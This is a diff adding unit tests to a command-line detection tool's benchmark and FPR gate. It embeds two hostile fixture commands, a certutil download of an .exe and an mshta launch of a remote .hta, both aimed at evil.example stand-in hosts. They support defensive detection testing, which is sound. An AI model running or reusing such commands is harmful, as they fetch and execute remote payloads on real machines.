@@ -1,4 +1,9 @@
+import io
+import json
+import tempfile
 import unittest
+from contextlib import redirect_stdout
+from pathlib import Path
 
 from cmd_unmask.benchmark import (
     compute_percentile,
@@ -6,8 +11,10 @@ from cmd_unmask.benchmark import (
     render_benchmark_pretty,
     run_benchmark,
 )
+from cmd_unmask.cli import main as cli_main
 from cmd_unmask.corpus import load_seed_corpus
 from cmd_unmask.models import BenchmarkReport, CorpusFixture, Severity
+from cmd_unmask.renderer import render_benchmark_summary
 
 
 class TestBenchmarkRunnerAndMetrics(unittest.TestCase):
@@ -77,6 +84,69 @@ class TestBenchmarkRunnerAndMetrics(unittest.TestCase):
         self.assertIn("FPR", rendered)
         self.assertIn("p50", rendered)
         self.assertIn("p95", rendered)
+
+    def test_cli_benchmark_builtin_and_json_format(self):
+        buf = io.StringIO()
+        with redirect_stdout(buf):
+            rc = cli_main(["--benchmark", "--no-color"])
+        self.assertEqual(rc, 0)
+        out = buf.getvalue()
+        self.assertIn("Regression Corpus Benchmark", out)
+        self.assertIn("PASS", out)
+
+        buf_json = io.StringIO()
+        with redirect_stdout(buf_json):
+            rc_json = cli_main(["--benchmark", "--format", "json"])
+        self.assertEqual(rc_json, 0)
+        payload = json.loads(buf_json.getvalue())
+        self.assertEqual(payload["failed"], 0)
+        self.assertEqual(payload["fpr"], 0.0)
+        self.assertIn("f1_score", payload)
+
+    def test_cli_corpus_dir_and_max_fpr_gate(self):
+        with tempfile.TemporaryDirectory() as tmpdir:
+            cdir = Path(tmpdir)
+            (cdir / "benign.jsonl").write_text(
+                json.dumps(
+                    {
+                        "fixture_id": "fp-gate-1",
+                        "label": "benign",
+                        "command": "certutil.exe -urlcache -f http://cdn.evil.example/a.exe a.exe",
+                        "expected_severity": "MEDIUM",
+                    }
+                )
+                + "\n",
+                encoding="utf-8",
+            )
+            (cdir / "malicious.jsonl").write_text(
+                json.dumps(
+                    {
+                        "fixture_id": "tp-gate-1",
+                        "label": "malicious",
+                        "command": "mshta.exe http://stager.evil.example/drop.hta",
+                        "min_severity": "MEDIUM",
+                    }
+                )
+                + "\n",
+                encoding="utf-8",
+            )
+            buf = io.StringIO()
+            with redirect_stdout(buf):
+                rc = cli_main(["--benchmark", "--corpus-dir", str(cdir), "--max-fpr", "0.0", "--no-color"])
+            self.assertEqual(rc, 2)
+            self.assertIn("FAIL", buf.getvalue())
+
+            buf_missing = io.StringIO()
+            with redirect_stdout(buf_missing):
+                rc_err = cli_main(["--benchmark", str(cdir / "missing.jsonl")])
+            self.assertEqual(rc_err, 1)
+
+    def test_renderer_benchmark_summary_table(self):
+        report = run_benchmark(load_seed_corpus()[:2])
+        summary = render_benchmark_summary(report, color=False)
+        self.assertIn("Precision", summary)
+        self.assertIn("FPR", summary)
+        self.assertIn("p95", summary)
 
 
 if __name__ == "__main__":
